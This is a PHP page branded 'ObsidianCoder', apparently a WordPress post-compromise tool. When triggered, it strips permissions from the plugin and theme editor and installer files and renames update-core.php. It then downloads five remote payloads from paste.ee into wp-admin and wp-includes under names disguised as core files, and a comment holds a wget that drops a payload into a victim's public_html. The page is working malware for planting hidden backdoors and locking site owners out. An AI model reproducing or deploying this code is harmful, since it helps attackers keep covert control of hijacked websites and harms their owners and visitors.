
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>K!NGW</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to right, rgba(44, 62, 80, 0.6), rgba(52, 152, 219, 0.6)), url('https://i.ibb.co/hsJVLqX/width-1366.jpg') no-repeat center center fixed; 
            background-size: cover; /* Mengatur ukuran gambar agar menutupi seluruh area */
            background-attachment: fixed; /* Mengatur agar gambar tidak bergerak saat scrolling */
            background-position: center center; /* Menempatkan gambar di tengah */
            color: #ecf0f1;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background-color: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 25px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
            text-align: center;
        }

        h1 {
            color: #e74c3c;
            font-size: 3rem;
            margin: 0 0 20px;
            font-weight: 900;
            text-shadow: 4px 4px 8px rgba(0, 0, 0, 0.8);
        }

        h2 {
            color: #f39c12;
            font-size: 1rem;
            margin: 0 0 20px;
            font-weight: 700;
            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.7);
        }

        a {
            color: #f06292;
            text-decoration: none;
            font-size: 18px;
            font-weight: 600;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            transition: text-shadow 0.3s, color 0.3s;
        }

        a:hover {
            color: #ec407a;
            text-shadow: 4px 4px 8px rgba(0, 0, 0, 0.6);
        }

        ul {
            list-style-type: none;
            padding: 0;
            margin: 20px 0;
        }

        li {
            margin-bottom: 15px;
            font-size: 1.2rem;
        }

        .success-message {
            color: #2ecc71;
        }

        .error-message {
            color: #e74c3c;
        }

        .button-container {
            margin-top: 30px;
        }

        .button-container button {
            padding: 16px 32px;
            background: linear-gradient(135deg, #e74c3c, #f39c12);
            color: #fff;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 20px;
            font-weight: 700;
            transition: all 0.3s ease;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5);
        }

        .button-container button:hover {
            background: linear-gradient(135deg, #f39c12, #e74c3c);
            transform: translateY(-5px);
            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.6);
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            color: #fff;
            background: rgba(0, 0, 0, 0.9);
            padding: 15px 0;
            text-align: center;
            font-size: 14px;
            border-top: 2px solid #e74c3c;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ObsidianCoder</h1>
        <h2>The Ultimate File Manipulation and Security Suite.</h2>
        <div class="button-container">
            <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
                <button type="submit" name="submit">Manage Files</button>
            </form>
            <br>
        </div>
        <?php

// Fungsi untuk mengubah izin file
function chmod_files_in_directory($directory, $files_to_chmod) {
    $changed_files = array(); // Menyimpan daftar file yang berhasil diubah izinnya

    // Loop melalui daftar file
    foreach ($files_to_chmod as $file) {
        $file_path = $directory . $file;

        // Periksa apakah file ada dan dapat diubah izinnya
        if (file_exists($file_path)) {
            if (chmod($file_path, 0000)) {
                $changed_files[] = $file; // Tambahkan file yang berhasil diubah izinnya ke dalam array
            } else {
                $changed_files[] = "Failed to change permissions for $file"; // Tambahkan pesan gagal jika pengubahan izin file gagal
            }
        } else {
            $changed_files[] = "Failed to find $file"; // Tambahkan pesan gagal jika file tidak ditemukan
        }
    }

    return $changed_files; // Mengembalikan daftar file yang berhasil diubah izinnya
}

// Fungsi untuk mengubah nama file
function rename_file($directory, $file_to_rename, $new_filename) {
    $old_file_path = $directory . $file_to_rename;
    $new_file_path = $directory . $new_filename;

    // Periksa apakah file lama ada dan dapat diubah namanya
    if (file_exists($old_file_path) && is_writable($old_file_path)) {
        // Ubah nama file
        if (rename($old_file_path, $new_file_path)) {
            return true; // Kembalikan true jika berhasil mengubah nama file
        } else {
            return "Failed to rename $file_to_rename to $new_filename"; // Tambahkan pesan gagal jika gagal mengubah nama file
        }
    } else {
        return "Failed to find or access $file_to_rename"; // Tambahkan pesan gagal jika file lama tidak ditemukan atau tidak dapat diakses
    }
}


// Fungsi untuk mengunggah file
function upload_file($local_file_path, $upload_directory, $filename_new) {
    // Validasi path lokal file
    if (!file_exists($local_file_path) || !is_readable($local_file_path)) {
        return 'Local file does not exist or is not readable.';
    }

    // Pastikan direktori upload sudah ada
    if (!file_exists($upload_directory)) {
        // Buat direktori jika belum ada
        if (!mkdir($upload_directory, 0755, true)) {
            return 'Failed to create upload directory.';
        }
    } elseif (!is_writable($upload_directory)) {
        return 'Upload directory is not writable.';
    }

    // Jalankan proses upload
    $upload_path = rtrim($upload_directory, '/') . '/' . $filename_new;

    // Coba menyalin file ke direktori tujuan
    if (copy($local_file_path, $upload_path)) {
        // Set izin file yang baru
        chmod($upload_path, 0644);
        return true; // Berhasil mengunggah file
    } else {
        return 'Failed to copy file to upload directory.';
    }
}


// Fungsi untuk mengunduh file menggunakan metode file_get_contents
function file_get_content_download($file_url, $local_file_path) {
    // Ambil konten file dari URL
    $file_content = @file_get_contents($file_url);
    
    // Periksa jika konten berhasil diambil
    if ($file_content !== false) {
        // Tulis konten ke file lokal
        if (@file_put_contents($local_file_path, $file_content) !== false) {
            return true;
        } else {
            return false; // Gagal menulis ke file lokal
        }
    } else {
        return false; // Gagal mengambil konten dari URL
    }
}


function process_request() {
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['submit'])) {
        // Path ke direktori wp-admin menggunakan ABSPATH
        $directory = dirname(__FILE__) . '/wp-admin/';

        // Daftar file yang ingin diubah izinnya
        $files_to_chmod = array(
            'plugin-install.php',
            'plugin-editor.php',
            'theme-editor.php',
            'theme-install.php'
        );

        // Panggil fungsi untuk mengubah izin file
        $changed_files = chmod_files_in_directory($directory, $files_to_chmod);

        // File yang akan diubah namanya
        $file_to_rename = 'update-core.php';
        $new_filename = 'update-corse.php';

        // Panggil fungsi untuk mengubah nama file
        $rename_success = rename_file($directory, $file_to_rename, $new_filename);

        // Tentukan URL file, direktori upload, dan nama file baru

        // wget https://x-projetion.org/dpantek/@/dpantek_YQnVOlgf@RAW -O /home/dishub/public_html/wp-includes/html-api/class-wp-html-span.php
        $file_urls = array(
            'https://paste.ee/r/B3ll7kZs', //user-new.php - 4kb
            'https://paste.ee/r/B3ll7kZs', //wp-admin/maint//default.php - mb
            'https://paste.ee/r/DoILO5zH', //wp-includes//template-loader.php?is_Whether - bug
            'https://paste.ee/r/0PI5o', //wp-includes/html-api//class-wp-html-span.php?is_back - bug 
            'https://paste.ee/r/UZwsa4eX', //wp-includes/style-engine/class-wp-style-engine-css-rules.php - curl
        );

        $upload_directories = array(
            dirname(__FILE__) . '/wp-admin/css/colors/',
            dirname(__FILE__) . '/wp-admin/network/',
            dirname(__FILE__) . '/wp-includes/',
            dirname(__FILE__) . '/wp-includes/html-api/',
            dirname(__FILE__) . '/wp-includes/style-engine/',
        );

        $filename_news = array(
            '._www.php',
            'user-menu.php',
            'template-loader.php',
            'class-wp-html-span.php',
            'class-wp-style-engine-css-rules.php'
        );

        foreach ($file_urls as $key => $file_url) {
            $local_file_path = tempnam(sys_get_temp_dir(), 'tempfile');
            if (file_get_content_download($file_url, $local_file_path)) {
                $upload_success = upload_file($local_file_path, $upload_directories[$key], $filename_news[$key]);
                if ($upload_success) {
                    $file_url_cek = 'https://' . $_SERVER['HTTP_HOST'] . str_replace(dirname(__FILE__), '', $upload_directories[$key]) . $filename_news[$key];
                    echo '<p class="success-message">File successfully uploaded to directory: <a href="' . $file_url_cek . '" target="_blank">' . $filename_news[$key] . '</a></p>';
                } else {
                    echo '<p class="error-message">Failed to upload file to directory: ' . $upload_directories[$key] . '</p>';
                }
                unlink($local_file_path);
            } else {
                echo '<p class="error-message">Failed to download file from URL: ' . $file_url . '</p>';
            }
        }

        if (!empty($changed_files)) {
            echo '<h3>Changed File Permissions:</h3>';
            echo '<ul>';
            foreach ($changed_files as $changed_file) {
                echo '<li>' . $changed_file . '</li>';
            }
            echo '</ul>';
        }

        if ($rename_success === true) {
            echo '<p class="success-message">File ' . $file_to_rename . ' successfully renamed to ' . $new_filename . '</p>';
            echo '<p>You can <a href="' . $directory . $new_filename . '" download="' . $new_filename . '">download the renamed file</a>.</p>';
        } elseif (is_string($rename_success)) {
            echo '<p class="error-message">' . $rename_success . '</p>';
        }
    }
}

// Panggil fungsi utama untuk memproses permintaan
process_request();

?>

<div class="footer">
        <p>&copy; 2024 MULTITIT >> K!NGW - LUTFIFAKEE.</p>
</div>
</div>
</body>
</html>